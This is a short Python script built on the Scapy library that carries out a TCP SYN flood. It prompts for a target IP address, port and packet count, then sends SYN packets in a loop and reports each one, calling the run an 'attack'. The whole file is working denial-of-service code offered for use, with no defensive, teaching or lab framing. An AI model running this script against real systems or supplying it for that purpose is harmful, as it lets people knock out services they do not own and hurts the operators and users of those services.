from scapy.all import *

# Input target details
target_ip = input("Enter target IP: ")
target_port = int(input("Enter target port: "))
packet_count = int(input("Enter number of SYN packets to send: "))

print(f"[*] Starting SYN Flood on {target_ip}:{target_port} with {packet_count} packets")

# Build base packet
ip = IP(dst=target_ip)
tcp = TCP(dport=target_port, flags="S")  # SYN flag

# Attack loop
for i in range(packet_count):
    send(ip/tcp, verbose=False)
    print(f"[+] Packet {i+1} sent")

print("[*] Attack completed!")
